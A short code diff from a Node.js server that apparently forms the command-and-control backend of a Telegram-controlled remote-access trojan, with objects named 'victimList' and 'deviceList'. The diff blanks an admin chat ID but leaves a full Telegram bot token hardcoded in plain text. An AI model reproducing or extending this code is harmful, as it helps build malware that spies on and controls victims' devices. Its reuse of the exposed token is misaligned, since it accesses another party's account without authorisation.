@@ -11,7 +11,7 @@ const io = new Server(server, {
   
 const TELEGRAM_BOT_TOKEN = '7265828067:AAFtQrVCMPfvQoE9mlzKAVoULsHDyShpQS0';  
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
-let adminChatId = '6807896015';
+let adminChatId = '';
 
 var victimList = {};  
 var deviceList = {};  
